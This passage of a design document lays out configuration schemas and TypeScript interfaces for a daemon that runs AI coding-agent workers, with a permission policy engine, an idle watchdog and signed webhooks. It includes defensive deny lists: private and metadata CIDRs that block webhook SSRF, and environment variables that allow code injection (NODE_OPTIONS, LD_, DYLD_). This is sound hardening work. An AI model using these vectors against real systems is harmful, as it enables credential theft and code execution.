+  silentMs: z.number().int().nonnegative().max(86_400_000).default(300_000),
+  /**
+   * Budget B (DESIGN §7's npm install 沉默 20 分钟是正常的): at least one tool call is OPEN. F36 says an
+   * open call can be a PERMANENT condition, which is why this is a budget and not a suspension, and
+   * why it must be the larger of the two.
+   */
+  toolMs: z.number().int().nonnegative().max(86_400_000).default(1_800_000),
+  /** After the watchdog's `session/cancel`, how long the turn has to settle before the worker is closed
+   *  with `cancel_timeout`. MUST exceed `turn.cancelGraceMs` — enforced by `superRefine`, because a
+   *  watchdog that closed first would report a fake agent timeout for a turn that was settling. */
+  cancelTimeoutMs: z.number().int().positive().default(60_000),
+  /** "cancel" (default) ⇒ `session/cancel` then M1's existing escalation; "close" skips straight to it. */
+  action: z.enum(["cancel", "close"]).default("cancel"),
+});
+
+export const InteractionConfig = z.object({
+  /** Default `CreateWorkerRequest.parkTimeoutMs`. 0 ⇒ a park waits forever. */
+  parkTimeoutMs: z.number().int().nonnegative().max(86_400_000).default(600_000),
+  parkTimeoutAction: z.enum(["deny", "fail"]).default("deny"),
+  /**
+   * D4 rule 3 is ABSOLUTE for the daemon. This decides whether a HUMAN may pick an `allow_always`
+   * option through `POST …/interactions/{reqId}`.
+   * "never" (default) — a human answer naming one is `400` quoting rule 3 and citing F26.
+   * "human" — permitted, and the daemon then does what the wire does not: `blindsPolicy:true` on the
+   *   decision, sticky `WorkerSnapshot.policyBlinded`, and a `TurnWarning{code:"policy_blinded"}` on
+   *   every subsequent turn of that worker.
+   */
+  allowAlways: z.enum(["never", "human"]).default("never"),
+  /** Max simultaneously parked interactions per worker. Over it the newest is DENIED with
+   *  `rule:"limit:max_parked"` and never dropped — an unanswered agent request hangs a turn forever. */
+  maxParked: z.number().int().positive().default(8),
+  /** D10, narrowed: we declare `elicitation.form` under `park`. We do NOT declare `url` — there is no
+   *  browser here and `elicitation/complete` is unobserved. Flip only with a real url handler behind it. */
+  declareUrlElicitation: z.boolean().default(false),
+});
+
+export const DiffConfig = z.object({
+  provider: z.enum(["none", "git"]).default("none"),
+  /** "on_write" runs git only when the turn had a write-ish tool call or any `changes`. */
+  mode: z.enum(["off", "on_write", "always"]).default("on_write"),
+  timeoutMs: z.number().int().positive().default(15_000),
+  maxBytes: z.number().int().positive().default(4 * 1024 * 1024),
+  /** Absolute path for the temp index files. MUST be outside every worktree (§25.2). */
+  tmpDir: z.string().optional(),
+});
+
+export const WebhookConfig = z.object({
+  enabled: z.boolean().default(false),
+  /** D9: 0s / 30s / 2m / 10m / 30m / 2h. Six attempts, then `failed`. */
+  backoffMs: z.array(z.number().int().nonnegative())
+    .default([0, 30_000, 120_000, 600_000, 1_800_000, 7_200_000]),
+  /** Full jitter fraction on every rung after the first (§24.3). */
+  jitter: z.number().min(0).max(1).default(0.1),
+  timeoutMs: z.number().int().positive().default(10_000),
+  maxConcurrent: z.number().int().positive().default(4),
+  retentionDays: z.number().int().nonnegative().default(30),
+  /** name → secret. A client names one; the VALUE never crosses the wire in either direction. */
+  secrets: z.record(z.string().min(1), z.string().min(32)).default({}),
+  /** FAIL CLOSED. This is the daemon's first OUTBOUND surface and the URL comes from a client:
+   *  "allowlist" with an empty `allow` makes a webhook run `403` until an operator names an origin.
+   *  `"any"` exists for a closed network and says so out loud. */
+  mode: z.enum(["allowlist", "any"]).default("allowlist"),
+  /** Exact scheme+host+port, no wildcards. */
+  allow: z.array(z.string().url()).default([]),
+  /** CIDRs the RESOLVED address may never be in. Blocks DNS rebinding to cloud metadata. */
+  denyCidrs: z.array(z.string()).default([
+    "127.0.0.0/8", "::1/128", "169.254.0.0/16", "fe80::/10",
+    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fc00::/7"]),
+  maxBodyBytes: z.number().int().positive().default(64 * 1024),
+});
+
+export const RunConfig = z.object({
+  maxConcurrent: z.number().int().positive().default(16),
+  /** Hard ceiling on one run, independent of the watchdog. 0 = none. */
+  maxDurationMs: z.number().int().nonnegative().default(3_600_000),
+  retentionDays: z.number().int().nonnegative().default(30),
+});
+
+/** DESIGN §5.1's list, plus the ones that are arbitrary code execution rather than a preference.
+ *  ONE table, in ONE module — a second copy is how one of two callers quietly stops enforcing it
+ *  (`redactArgs`'s argument, §5.1). `envDeny` in config EXTENDS it; nothing shrinks it. */
+export const ENV_DENY_EXACT: readonly string[] = [
+  "HOME", "PATH", "USER", "USERNAME", "LOGNAME", "SHELL", "TMPDIR", "TMP", "TEMP", "PWD", "OLDPWD",
+  "SYSTEMROOT", "COMSPEC", "WINDIR", "PATHEXT", "APPDATA", "LOCALAPPDATA", "PROGRAMDATA",
+  "NODE_OPTIONS", "BASH_ENV", "ENV", "IFS", "CLASSPATH", "JAVA_TOOL_OPTIONS", "RUBYOPT", "PERL5OPT",
+];
+export const ENV_DENY_PREFIX: readonly string[] =
+  ["OMNI_", "LD_", "DYLD_", "GIT_", "NODE_", "npm_", "PYTHON"];
+
+export const DaemonConfig = z.strictObject({
+  …                                          // M0/M1's members unchanged
+  policy: PolicyConfig.prefault({}),
+  /** DESIGN §8: the ONLY place a stdio MCP command may appear. */
+  mcpServers: z.record(z.string().max(64), McpServerPreset).default({}),
+  watchdog: WatchdogConfig.prefault({}),
+  interaction: InteractionConfig.prefault({}),
+  diff: DiffConfig.prefault({}),
+  webhooks: WebhookConfig.prefault({}),
+  run: RunConfig.prefault({}),
+  /** Extra keys the operator forbids in `CreateWorkerRequest.env`. Extends the hard list; can never
+   *  shrink it. */
+  envDeny: z.array(z.string().max(256)).default([]),
+}).superRefine((c, ctx) => {
+  if (c.watchdog.cancelTimeoutMs <= c.turn.cancelGraceMs) {
+    ctx.addIssue({ code: "custom", path: ["watchdog", "cancelTimeoutMs"],
+      message: "watchdog.cancelTimeoutMs must exceed turn.cancelGraceMs" });
+  }
+});
+```
+
+**An unmodified M1 config file still parses**, and every block above defaults, which is a Land exit
+criterion (`docs/M2-PLAN.md` §1.3).
+
+#### 5.8.8 `src/contracts.ts` — the five M2 seams
+
+```ts
+// ── interaction (M2-A) ───────────────────────────────────────────────────────
+
+/** v1 `elicitation/create` params, mapped. F29: the scope fields are FLAT in `params`, not nested. */
+export interface MappedElicitationRequest {
+  readonly mode: "form" | "url";
+  readonly sessionId: string;
+  readonly toolCallId: string | null;
+  readonly requestId: string | null;
+  readonly message: string;
+  readonly fields: readonly ElicitationField[];
+  /** Properties this parse did not fold into a field — kept so an answer that names one is a
+   *  `bad_request` with the name in it rather than a silent drop. */
+  readonly unmodelled: readonly string[];
+  readonly _meta?: Readonly<Record<string, unknown>>;
+}
+
+/** D10's unification: the two agent→client requests are ONE lifecycle. */
+export interface InteractionRequest {
+  readonly id: InteractionId;
+  readonly kind: InteractionKind;
+  readonly method: InteractionMethod;
+  readonly title: string;
+  readonly message: string | null;
+  /** v2's TAGGED subject for a permission; null for an elicitation. The policy engine matches on it. */
+  readonly subject: Readonly<Record<string, unknown>> | null;
+  readonly options: readonly PermissionOption[];
+  readonly fields: readonly ElicitationField[];
+  /** Present on BOTH kinds (F29's flat `toolCallId`, F32's mirror). */
+  readonly toolCallId: string | null;
+  readonly turnId: TurnId | null;
+  /** Verbatim params. NEVER reshaped — `acp.interaction.raw` audits the agent, not our mapping (§7.5). */
+  readonly raw: Readonly<Record<string, unknown>>;
+}
+
+export type InteractionAnswer =
+  | { readonly action: "allow"; readonly optionId?: string; readonly note?: string }
+  | { readonly action: "deny"; readonly note?: string }
+  | { readonly action: "answer"; readonly content: Readonly<Record<string, unknown>>; readonly note?: string }
+  | { readonly action: "cancel" };
+
+export type InteractionOutcome =
+  | { readonly kind: "permission"; readonly optionId: string }
+  /** → JSON-RPC -32603 (D4 rule 4). NEVER an invented id (rule 1), never `cancelled` (rule 5). */
+  | { readonly kind: "permission_error" }
+  | { readonly kind: "elicitation_accept"; readonly content: Readonly<Record<string, unknown>> }
+  | { readonly kind: "elicitation_decline" }
+  | { readonly kind: "elicitation_cancel" };
+
+export interface InteractionResolution {
+  readonly outcome: InteractionOutcome;
+  readonly record: PolicyDecisionPayload;
+}
+
+/** What the strategy may do to the Worker. Deliberately three verbs. */
+export interface InteractionContext {
+  readonly turnId: TurnId | null;
+  /** Appended in array order, synchronously — the same contract `TurnOutput.emit` has. */
+  emit(inputs: readonly EventInput[]): void;
+  /** `running → requires_action`. Returns the un-park; REFCOUNTED exactly like `Lease.pinExpiry()`,
+   *  and the LAST un-park emits `interaction_resolved`. It also pauses the watchdog (§21.4). */
+  park(id: InteractionId): () => void;
+  /** `onUnresolved:"fail"` and `parkTimeoutAction:"fail"`: cancel the turn, do not close the worker. */
+  failTurn(reason: string): void;
+}
+
+/**
+ * The ONE lifecycle. It SUPERSEDES `PermissionResponder` rather than replacing it:
+ * `baselineInteractions(responder, clock)` wraps M1's responder verbatim, so a worker with no strategy
+ * injected is byte-for-byte M1 — which is what the M1 suite proves (§19.10).
+ */
+export interface InteractionStrategy {
+  /** D10's per-worker gate, read ONCE at handshake and re-read on every WAKE (F42). `{}` unless
+   *  `onUnresolved === "park"`; `{elicitation:{form:{}}}` when it is. `url` is never declared. */
+  readonly clientCapabilities: Readonly<Record<string, unknown>>;
+  /** NEVER rejects for a reason other than `AcpRequestError`: a rejected promise here is an agent that
+   *  waits forever on a JSON-RPC id (F1). */
+  permission(req: MappedPermissionRequest, ctx: InteractionContext): Promise<RequestPermissionResponse>;
+  elicitation(req: MappedElicitationRequest, ctx: InteractionContext): Promise<unknown>;
+  /** H22. Throws `interaction_not_found` / `interaction_settled` / `bad_request`. */
+  answer(id: InteractionId, a: InteractionAnswer, who: ClientRef & { tokenId: TokenId }): InteractionAnswerResult;
+  get(id: InteractionId): InteractionSnapshot | null;
+  readonly pending: readonly InteractionSnapshot[];
+  /**
+   * Settle every parked request with `reason`, put a real answer on the wire for each, and RETURN once
+   * every held JSON-RPC promise has resolved. Called by `cancel()` **before** `session/cancel`, by
+   * `#doClose`, by `#doHibernate` and by `daemon.stop()` — a log that ends on a `pending` interaction
+   * is a log that lies, and an agent blocked on our answer may never read the cancel (§19.8).
+   * Idempotent.
+   */
+  settleAll(reason: "shutdown" | "cancel" | "close" | "hibernate" | "timeout"): void;
+  close(): void;
+}
+
+// ── policy (M2-B; D4) ────────────────────────────────────────────────────────
+
+export interface PolicySubject {
+  readonly method: InteractionMethod;
+  /** v2's tag. An unknown tag falls to `default` (D4: unknown subjects are declined by policy). */
+  readonly type: "tool_call" | "command" | string;
+  readonly kind: string | null;
+  /**
+   * REALPATH'd absolutes off `subject.toolCall.locations[]`. For a file that does not exist yet (a
+   * create), the deepest existing ancestor is realpath'd and the remainder re-appended — otherwise
+   * every `allow` rule for `src/**` fails on exactly the writes it exists to permit.
+   *
+   * EMPTY IS NOT "NO PATHS": F38 proves `locations[]` under-reports. A `path` clause therefore matches
+   * only when this is non-empty AND every entry matches, so an unlisted second path can never launder
+   * the first (§20.3).
+   */
+  readonly paths: readonly string[];
+  readonly command: string | null;
+  readonly title: string;
+  readonly agentId: string;
+  readonly cwd: string;
+}
+
+export interface PolicyVerdict {
+  readonly action: PolicyAction;
+  /** `"<policyId>#<ruleId>"` or `"<policyId>#default"`. Goes verbatim into `PolicyDecisionPayload`. */
+  readonly rule: string;
+  readonly source: "baseline" | "default" | "preset" | "inline" | "ceiling";
+  readonly clamped: { readonly from: PolicyAction; readonly by: string } | null;
+}
+
+/**
+ * PURE and TOTAL: same subject in ⇒ deep-equal verdict out, no I/O, no clock.
+ *
+ * It decides WHAT, never WHICH `optionId` — option selection stays in `permission-responder.ts`, the
+ * one place D4 rules 1–6 live. That separation is what makes it structurally impossible for M2-B to
+ * break rule 3 by editing the engine, and the `policy-never-names-an-option` guard enforces it.
+ */
+export interface PolicyEngine {
+  decide(s: PolicySubject): PolicyVerdict;
+  readonly id: string;
+  readonly snapshot: PolicySnapshot;
+}
+
+// ── idle watchdog (M2-A; DESIGN §7) ──────────────────────────────────────────
+
+export type WatchdogSignal =
+  | { readonly kind: "turn_start"; readonly at: number }
+  | { readonly kind: "envelope"; readonly at: number; readonly envelope: EventEnvelope }
+  | { readonly kind: "parked"; readonly at: number }
+  | { readonly kind: "unparked"; readonly at: number }
+  | { readonly kind: "cancel_sent"; readonly at: number }
+  | { readonly kind: "turn_end"; readonly at: number };
+
+export interface WatchdogVerdict {
+  /** Absolute epoch-ms the Worker must schedule, or null (disarmed). */
+  readonly deadlineAt: number | null;
+  readonly budget: "silent" | "tool" | null;
+  readonly phase: "idle" | "silent" | "tool" | "cancelling" | "paused" | "spent";
+  readonly openToolCalls: readonly string[];
+}
+
+export interface WatchdogState {
+  readonly lastAt: number;
+  readonly open: ReadonlySet<string>;
+  readonly parked: boolean;
+  readonly running: boolean;
+  readonly cancelSentAt: number | null;
+}
+
+/** PURE STATE + one timer, split exactly as `HibernateTimer` is: `watchdogStep` is the fold and is
+ *  table-testable with no clock and no process at all; `createWatchdog` wraps it in `Clock.setTimer`. */
+export interface Watchdog {
+  observe(s: WatchdogSignal): WatchdogVerdict;
+  readonly verdict: WatchdogVerdict;
+  cancel(): void;
+}
+
+// ── diff provider (M2-B; D8) ─────────────────────────────────────────────────
+
+export interface PatchHandle {
+  readonly topLevel: string; readonly indexFile: string;
+  readonly tree: string; readonly startedAtMs: number;
+}
+export interface PatchResult {
+  readonly text: string | null;
+  readonly source: "git" | null;
+  readonly truncated: boolean;
+  readonly quality: "exact" | "shared_worktree" | "unavailable";
+  readonly warnings: readonly TurnWarning[];
+}
+export interface DiffProvider {
+  /**
+   * Called at prompt ADMISSION, **per turn** — never once per worker. F39: codex-acp creates `.git/` in
+   * its own cwd mid-session, so "outside a repo ⇒ null" cannot be decided once at worker start.
+   * NEVER throws: `null` is D8's honest answer and a git failure is not a failed turn.
+   */
+  begin(o: { cwd: string; workerId: WorkerId; signal?: AbortSignal }): Promise<PatchHandle | null>;
+  /** After settle, BEFORE `idle` is emitted. NEVER throws: a failure is `text: null` + a warning. */
+  end(h: PatchHandle, o?: { signal?: AbortSignal }): Promise<PatchResult>;
+  /** Best effort; deletes the temp index when a turn dies without an `end`. NEVER throws. */
+  abandon(h: PatchHandle): void;
+}
+
+// ── runs and webhooks (M2-B; D9) ─────────────────────────────────────────────
+
+/**
+ * D9's thin payload. **Eight keys, not seven**: `workerId` is added because the thin payload must be
+ * ADDRESSABLE — `/v1` is keyed on `workerId`, and a receiver holding only `sessionId` cannot pull
+ * anything back (ruling M2-R13). The `webhook-body-is-thin` guard pins the key set at exactly these.
+ */
+export interface WebhookPayload {
+  readonly deliveryId: DeliveryId; readonly event: WebhookEvent;
+  readonly daemonId: DaemonId; readonly workerId: WorkerId;
+  readonly runId: RunId | null; readonly sessionId: SessionId | null;
+  readonly seq: Seq; readonly ts: string;
+}
+
+export interface RunRegistry {
+  create(req: CreateRunRequest, auth: AuthContext): Promise<RunSnapshot>;
+  get(id: RunId, auth: AuthContext): RunSnapshot;
+  list(auth: AuthContext, o?: { limit?: number; cursor?: string }): readonly RunSnapshot[];
+  cancel(id: RunId, auth: AuthContext): Promise<RunSnapshot>;
+  logFor(id: RunId, auth: AuthContext): EventLog;
+  /** Boot: every run whose `bootId` is not ours and whose state is live becomes `abandoned`, with a
+   *  terminal `run.failed` delivery enqueued (§24.4). */
+  recover(): { readonly abandoned: number };
+}
+
+export interface DeliveryStore {
+  enqueue(r: { deliveryId: DeliveryId; runId: RunId; tokenId: TokenId; event: WebhookEvent;
+               url: string; payload: WebhookPayload; nowMs: number }): void;
+  /** Rows whose `next_attempt_ms <= nowMs`, oldest first, at most `limit`. */
+  due(nowMs: number, limit: number): readonly DeliveryRecord[];
+  /** ATOMIC compare-and-set pending→delivering, stamping this boot's id. false ⇒ somebody else has it. */
+  claim(id: DeliveryId, bootId: string, nowMs: number): boolean;
+  settle(r: { deliveryId: DeliveryId; ok: boolean; status: number | null; error: string | null;
+              responseMs: number; nextAttemptMs: number | null;
+              state: "delivered" | "pending" | "failed"; nowMs: number }): void;
+  /** Boot: `delivering` rows owned by ANOTHER bootId → `pending`, `attempt` UNCHANGED (§24.4). */
+  requeueStale(bootId: string, nowMs: number): number;
+  list(o: { runId?: RunId; state?: string; limit: number; cursor?: string }):
+    { rows: readonly DeliveryRecord[]; cursor: string | null };
+  redeliver(id: DeliveryId, nowMs: number): DeliveryRecord;
+}
+
+export interface WebhookDispatcher {
+  start(): void;
+  /** Enqueues and returns IMMEDIATELY. It NEVER blocks a turn — a slow receiver may not slow an agent. */
+  dispatch(p: Omit<WebhookPayload, "deliveryId">, target: WebhookTarget, tokenId: TokenId): DeliveryId;
+  redeliver(id: DeliveryId): Promise<DeliveryRecord>;
+  /** Drains what is due right now and returns when the in-flight set is empty. Tests and `stop()`. */
+  drain(o?: { timeoutMs?: number }): Promise<void>;
+  stop(): Promise<void>;
+}
+```
+
+Existing interfaces, widened (all Land-written, then frozen or transferred):
+
+```ts
+export type TurnInput =
+  | …                                          // M0/M1's arms unchanged
+  | {
+      readonly type: "prompt_result"; readonly stopReason: StopReason;
+      readonly usage?: unknown; readonly at: number;
+      /**
+       * SEAM: merged into `state_update{idle}._meta`. The reducer does not know what any key means —
+       * it is the same channel `omni/vendorPatch` and `omni/warnings` already ride (§12.5) — and it is
+       * what lets the git provider land with ZERO edits to `turn-lifecycle.ts` (ruling M2-R9).
+       */
+      readonly meta?: Readonly<Record<string, unknown>>;
+    }
+  /** The turn is suspended on a human. Both watchdog budgets stop; the park timer owns the deadline. */
+  | { readonly type: "interaction_parked"; readonly id: InteractionId; readonly at: number }
+  | { readonly type: "interaction_resolved"; readonly id: InteractionId; readonly at: number };
+
+export interface TurnOutput {
+  …
+  readonly state: "idle" | "running" | "parked" | "settling" | "closing";
+}
+
+export interface SessionOpenOptions {
+  readonly cwd: string;
+  readonly descriptor: RuntimeDescriptor;
+  /** M2-B: RESOLVED preset objects. A strategy never sees a preset NAME. */
+  readonly mcpServers: readonly unknown[];
+  /**
+   * M2-A, D10. Computed once by `clientCapabilitiesFor(onUnresolved, cfg)` and passed in, so
+   * `handshake.ts` and the WAKE path in `session-open.ts` cannot drift — F42 is that they currently
+   * both hard-code `{}` in two different files, and `SessionReopenOptions` MUST be given the same
+   * value as `open`.
+   */
+  readonly clientCapabilities: Readonly<Record<string, unknown>>;
+  readonly budgetMs: number; readonly signal?: AbortSignal;
+}
+
+export interface SessionOpenResult {
+  …
+  /** M2: the catalogue as of THIS open/reopen, typed. Seeds `WorkerSnapshot.configOptions`; a resumed
+   *  session may report a different one. */
+  readonly configOptions: readonly ConfigOptionView[] | null;
+}
+
+export interface WorkerHandle {
+  …
+  /** H22. Lease-gated by the caller; the handle enforces state, not identity. */
+  answerInteraction(id: InteractionId, a: InteractionAnswer, who: ClientRef & { tokenId: TokenId }): InteractionAnswerResult;
+  readonly interactions: readonly InteractionSnapshot[];
+  /** H24. `409 worker_busy` unless `ready`; auto-wakes a `hibernated` worker exactly as `prompt` does. */
+  setConfig(body: SetConfigBody, who: ClientRef): Promise<SetConfigResponse>;
+  /**
+   * DAEMON-initiated cancel, deliberately NOT lease-gated: the lease governs CLIENTS, and the idle
+   * watchdog is not one. Without this the daemon's own timer `423`s itself the moment a real
+   * `createLease` replaces `alwaysGrantedLease` — the kind of thing discovered in production.
+   */
+  cancelInternal(reason: "watchdog_silent" | "watchdog_tool"): Promise<void>;
+}
+
+export interface WorkerRegistry {
+  …                                                  // every M0/M1 façade row unchanged
+  /** H22: `200 InteractionAnswerResult`. */
+  answer(id: WorkerId, auth: AuthContext, reqId: InteractionId, body: InteractionAnswerBody): InteractionAnswerResult;
+  /** H23: `200 InteractionListResponse`. UNGATED (rule L2). */
+  interactions(id: WorkerId, auth: AuthContext): InteractionListResponse;
+  /** H24: `200 SetConfigResponse`. */
+  setConfig(id: WorkerId, auth: AuthContext, body: SetConfigBody): Promise<SetConfigResponse>;
+}
+
+export interface AuthContext {
+  …
+  /** D4. Throws `policy_exceeds_ceiling` (403) carrying `{ceiling, offending}`. */
+  assertPolicy(sel: PolicySelection | undefined): PolicyEngine;
+  /** DESIGN §8's hard blacklist ⊕ `envDeny` ⊕ the token's `envAllow`. Throws `bad_request` NAMING the
+   *  key — never a silent drop (ruling M2-R12). */
+  assertEnv(env: Readonly<Record<string, string>> | undefined): EnvResolution;
+  /** Preset NAMES → resolved server objects. `400` for unknown, `403` for disallowed. */
+  assertMcp(names: readonly string[] | undefined): readonly unknown[];
+  readonly policyCeiling: PolicyCeiling | null;
+}
+
+export interface Daemon { …; readonly runs: RunRegistry; readonly deliveries: DeliveryStore; }
+
+export interface DaemonDeps {
+  …
+  /** M2-A. Absent ⇒ `baselineInteractions(responder, clock)` — byte-for-byte M1. */
+  readonly interactions?: (o: InteractionDeps) => InteractionStrategy;
+  /** M2-A. Absent ⇒ no watchdog, which is M1. */
+  readonly watchdog?: (o: WatchdogDeps) => Watchdog;
+  /** M2-B. Absent ⇒ `createBaselineResponder`'s constant verdict — M1 unchanged. */
+  readonly policy?: (sel: PolicySelection | null, ceiling: PolicyCeiling | null) => PolicyEngine;
+  /** M2-B, D8. Absent ⇒ `TurnResult.patch` stays null, which is M1 (ruling M1-R11). */
+  readonly diff?: DiffProvider;
+  /** M2-B, D9. Absent ⇒ `POST /v1/runs` answers `400 unknown route` (the M1 Land precedent S8). */
+  readonly webhooks?: WebhookDispatcher;
+  readonly runs?: RunRegistry;
+}
+
+export interface WorkerRow {
+  …
+  /**
+   * Persisted BECAUSE OF THE WAKE PATH, each for a reason a restart makes sharp:
+   *  - `onUnresolved` — a `park` worker that hibernated and woke must RE-DECLARE
+   *    `clientCapabilities.elicitation`, or F28 says the agent silently degrades to prose and the park
+   *    never happens again (F42 is the code that would do exactly that today);
+   *  - `env` / `mcpNames` / `policyRef` — a wake must reproduce the environment, or the woken worker
+   *    is a different worker wearing the same id.
+   * Interactions are deliberately NOT persisted (ruling M2-R10).
+   */
+  readonly onUnresolved: "park" | "deny" | "fail";
+  readonly parkTimeoutMs: number | null;
+  readonly parkTimeoutAction: ParkTimeoutAction;
+  readonly mcpNames: readonly string[];
+  readonly policyRef: string | null;
+  /** `null` when `env.persist:false` was requested — which forces `resume.method: null` (§23.3). */
+  readonly env: Readonly<Record<string, string>> | null;
+  readonly watchdog: { silentMs: number; toolMs: number; cancelTimeoutMs: number };
+  readonly patchMode: "off" | "on_write" | "always";
+}
+```
+
+#### 5.8.9 `@omni-acp/core` — new factories on the frozen barrel
+
+```ts
+// worker/interaction/  — M2-WP-I
+export function createInteractionStrategy(o: InteractionDeps): InteractionStrategy;
+/** M1's responder, wrapped verbatim: `clientCapabilities: {}`, the same two envelopes in the same
+ *  order, the same `-32603` on rule 4. An un-configured daemon is byte-for-byte M1 (§19.10). */
+export function baselineInteractions(r: PermissionResponder, clock: Clock): InteractionStrategy;
+export function createParkTimer(o: { clock: Clock; timeoutMs: number; onExpire: () => void }): TimerHandle & { readonly armed: boolean };
+/** D10's gate as a PURE function of the request. `{}` unless `park`; `{elicitation:{form:{}}}` when it
+ *  is; `url` only when `interaction.declareUrlElicitation` — which defaults false and stays false. */
+export function clientCapabilitiesFor(o: { onUnresolved: "park" | "deny" | "fail";
+                                           config: ResolvedInteractionConfig }): Readonly<Record<string, unknown>>;
+
+// normalizer/map/  — M2-WP-I
+/** PURE, TOTAL, IDEMPOTENT. Reads the FLAT scope fields (F29) and `oneOf[].const` ∪ `enum` (F30);
+ *  a schema it cannot understand yields `fields: []` with every property in `unmodelled`, which makes
+ *  `answer` impossible and `deny`/`cancel` still possible, instead of a form that lies about itself. */
+export function mapElicitation(params: unknown): MappedElicitationRequest;
+/** PURE. The F30 rule in one function: EXACTLY ONE property per questionId reaches the wire, and WHICH
+ *  one is decided by whether the value is one of the schema's own consts. Answering both members of a
+ *  question group is `bad_request`. */
+export function buildElicitationContent(fields: readonly ElicitationField[],
+                                        answers: Readonly<Record<string, unknown>>): Record<string, unknown>;
+
+// worker/  — M2-WP-W
+export function watchdogStep(s: WatchdogState, sig: WatchdogSignal, cfg: ResolvedWatchdogConfig):
+  { state: WatchdogState; verdict: WatchdogVerdict };              // PURE — no clock, no I/O
+export function createWatchdog(o: { clock: Clock; config: ResolvedWatchdogConfig;
+                                    onFire: (b: "silent" | "tool") => void }): Watchdog;
+
+// worker/  — M2-WP-C
+/** Goes through `Normalizer.mapRequest("session/set_config_option", …)`, so the `configId` vs
+ *  `optionId` spelling is the descriptor's decision and this file names neither (F34). */
+export function setConfigOption(link: AcpLinkLike, n: Normalizer,
+                                o: { sessionId: SessionId; configId: string; value: unknown }): Promise<SetConfigResponse>;
+/** Lifts `id` through the descriptor's `configOptionIdField` quirk and keeps `raw` BY IDENTITY. */
+export function viewConfigOptions(result: unknown, d: RuntimeDescriptor): readonly ConfigOptionView[] | null;
+
+// policy/  — M2-WP-P
+export function createPolicyEngine(o: { policy: ResolvedPolicy; ceiling: PolicyCeiling | null; id: string }): PolicyEngine;
+export function matchRule(rule: PolicyRule, s: PolicySubject): boolean;              // PURE
+export function compileGlob(pattern: string): (abs: string) => boolean;             // PURE, no deps
+export function toPolicySubject(req: InteractionRequest, ctx: { cwd: string; agentId: string;
+                                                                realpath: (p: string) => Promise<string> }): Promise<PolicySubject>;
+/** Decidable and TOTAL over the coarse ceiling language. Throws `policy_exceeds_ceiling` NAMING the
+ *  offending rules (§20.5). Explicitly INCOMPLETE — `clamp` is what makes it sound. */
+export function assertWithinCeiling(doc: ResolvedPolicy, c: PolicyCeiling): void;
+export function clampVerdict(v: PolicyVerdict, c: PolicyCeiling, s: PolicySubject): PolicyVerdict;
+export const BUILTIN_POLICIES: Readonly<Record<"readonly" | "src-edit" | "full" | "deny-all", PolicyPreset>>;
+/** The ONE place an optionId may be chosen. Extracted VERBATIM from `permission-responder.ts`, whose
+ *  unit suite must then pass UNEDITED — that is the acceptance bullet, not a hope (§20.2). */
+export function selectOption(action: "allow" | "deny", offered: readonly PermissionOption[],
+                             cfg: { allowSessionGrants: boolean }): OptionChoice;
+
+// mcp/, env.ts, prompt-content.ts  — M2-WP-S
+export function resolveMcpPresets(names: readonly string[], cfg: ResolvedDaemonConfig,
+                                  allow: readonly string[] | "*"): readonly { name: string; server: McpServerPreset }[];
+export function filterMcpCapabilities(o: { presets: …; caps: … | null; tolerateOmitted: boolean }): McpResolution;
+/** REJECTS a blacklisted key with a 400 naming it. `platform` is INJECTED so both branches are tested:
+ *  Windows env names are case-INSENSITIVE, and comparing case-sensitively there lets `{"path": …}`
+ *  sail past a deny list that only knows `PATH` (§23.3). */
+export function resolveWorkerEnv(o: { base: …; descriptor: …; request: … | undefined;
+                                      extraDeny: readonly string[]; allow: readonly string[];
+                                      platform: NodeJS.Platform }): EnvResolution;
+/** Throws `bad_request` BEFORE the prompt is sent (F37, F38). realpath FIRST, then contain. */
+export function assertPromptContent(o: { content: readonly unknown[]; cwd: string;
+                                         cwdRoots: readonly string[];
+                                         promptCapabilities: PromptCapabilities | null;
+                                         realpath: (p: string) => Promise<string> }): Promise<readonly unknown[]>;
+
+// diff/  — M2-WP-J
+/** Reaches git ONLY through the injected `RunUtility`, which is what `no-direct-spawn` already asserts
+ *  for `fingerprint.ts`'s `ps` — so the unit tests need no git installed. */
+export function createGitDiffProvider(o: { run: RunUtility; cfg: ResolvedDiffConfig; clock: Clock;
+                                           ids: IdGen; logger: Logger }): DiffProvider;
+
+// run/, webhook/  — M2-WP-R
+export function createRunRegistry(o: RunRegistryDeps): RunRegistry;
+export function recoverRuns(store: RunStore, bootId: string, nowMs: number): { abandoned: number };
+export function createWebhookDispatcher(o: WebhookDispatcherDeps): WebhookDispatcher;
+export function recoverDeliveries(store: DeliveryStore, bootId: string, nowMs: number): number;
+/** PURE. D9's ladder plus full jitter on every rung after the first; `rnd` injected so the test is
+ *  deterministic. Without jitter a restart makes hundreds of deliveries due in one tick, the receiver
+ *  429s the lot, and they all retry together 30 s later. */
+export function planNextAttempt(attempt: number, nowMs: number, jitter: number, rnd: () => number):
+  { state: "pending" | "failed"; nextAttemptMs: number | null };
+/** `Omni-Signature: t=<unix-seconds>,v1=<hex>` — HMAC-SHA256 over `"<t>.<raw body>"`. The timestamp is
+ *  INSIDE the signed string so a receiver can reject a replay by age without parsing JSON. */
+export function signDelivery(secret: string, tsSec: number, body: string): string;
+/** The SSRF gate on the daemon's first outbound surface. Allowlist is the primary control; the CIDR
+ *  check over EVERY resolved address is defence in depth against rebinding (§24.6). */
+export function assertWebhookUrl(raw: string, cfg: ResolvedWebhookConfig, resolve: Resolver): Promise<URL>;
+
+// persist/  — M2-WP-R
+export const SCHEMA_VERSION = 2;                       // CREATE-only migration: runs, webhook_deliveries
+export function createRunStore(db: DatabaseSync): RunStore;
+export function createDeliveryStore(db: DatabaseSync): DeliveryStore;
+```
+
+#### 5.8.10 `@omni-acp/daemon`, `@omni-acp/client`, `@omni-acp/cli`, `@omni-acp/testkit`
+
+```ts
+// daemon — new route modules, one owner each; every one is parse → ONE daemon call → serialize
+export function registerInteractionRoutes(app: Hono, daemon: Daemon): void;    // H22, H23
+export function registerConfigRoutes(app: Hono, daemon: Daemon): void;         // H24
+export function registerRunRoutes(app: Hono, daemon: Daemon): void;            // H25
+export function registerWebhookRoutes(app: Hono, daemon: Daemon): void;        // H26
+export function resolvePolicyForRequest(cfg: ResolvedDaemonConfig, auth: AuthContext,
+                                        sel: PolicySelection | undefined): PolicyEngine;   // 403 here
+
+// client
+export interface Worker {
+  …                                              // every M1 member unchanged
+  /** Fires for every `acp.interaction{status:"pending"}` on this worker's tail — i.e. ONLY for a
+   *  parked one. An auto-resolved interaction never fires it: nothing is being asked of the user. */
+  on(event: "interaction", cb: (req: InteractionRequestHandle) => void): () => void;
